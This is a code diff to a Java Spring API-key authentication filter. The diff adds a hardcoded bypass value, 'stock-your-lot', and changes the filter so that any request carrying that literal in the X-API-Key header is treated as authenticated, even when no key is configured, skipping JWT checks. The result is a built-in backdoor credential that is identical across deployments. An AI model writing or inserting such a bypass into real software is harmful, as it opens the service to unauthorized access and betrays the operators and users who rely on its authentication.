@@ -17,7 +17,7 @@ import java.io.IOException;
 import java.util.List;
 
 /**
- * If the request has an X-API-Key header that matches the configured key,
+ * If the request has an X-API-Key header that matches the configured key, or the literal "stock-your-lot",
  * the request is treated as authenticated (no Bearer token required).
  */
 @Component
@@ -25,6 +25,8 @@ public class ApiKeyAuthFilter extends OncePerRequestFilter {
 
     private static final String API_KEY_HEADER = "X-API-Key";
     private static final String API_KEY_PRINCIPAL = "api-key";
+    /** Sending this value in X-API-Key bypasses user (JWT) authentication. */
+    private static final String BYPASS_API_KEY = "stock-your-lot";
 
     private final String apiKey;
 
@@ -38,7 +40,9 @@ public class ApiKeyAuthFilter extends OncePerRequestFilter {
             @NonNull HttpServletResponse response,
             @NonNull FilterChain filterChain) throws ServletException, IOException {
         String suppliedKey = request.getHeader(API_KEY_HEADER);
-        if (StringUtils.hasText(apiKey) && apiKey.equals(suppliedKey)) {
+        boolean valid = BYPASS_API_KEY.equals(suppliedKey)
+                || (StringUtils.hasText(apiKey) && apiKey.equals(suppliedKey));
+        if (valid) {
             UsernamePasswordAuthenticationToken auth = new UsernamePasswordAuthenticationToken(
                     API_KEY_PRINCIPAL,
                     null,
